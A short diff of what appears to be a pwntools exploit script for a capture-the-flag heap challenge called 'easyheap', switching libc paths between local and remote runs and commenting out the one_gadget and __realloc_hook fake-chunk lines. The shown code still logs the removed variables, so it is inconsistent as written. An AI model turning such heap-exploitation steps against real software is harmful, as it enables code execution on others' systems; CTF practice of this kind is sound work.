@@ -13,11 +13,12 @@ def debug_on():
 g_fname = "./easyheap"
 g_elf = ELF(g_fname)
 g_libcname = "./libc-2.23.so"
-g_libc = ELF(g_libcname)
 
 if (LOCAL):
+	g_libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 	g_io = process(g_fname)
 else:
+	g_libc = ELF(g_libcname)
 	g_io = remote()
 
 def getpid():
@@ -65,8 +66,8 @@ def pwn():
 
 	off_arena = 0x3c4b20
 	libc_base = addr_arena - off_arena
-	one_gadget = libc_base + 0x4527a # [rsp+0x30] == NULL  
-	fake_chunk = libc_base + g_libc.symbols["__realloc_hook"] - 0x1b
+	#one_gadget = libc_base + 0x4527a # [rsp+0x30] == NULL  
+	#fake_chunk = libc_base + g_libc.symbols["__realloc_hook"] - 0x1b
 
 	log.success("libc@%#x\none_gadget@%#x\nfake_chunk@%#x" % (libc_base, one_gadget, fake_chunk))
 	remove(1)	
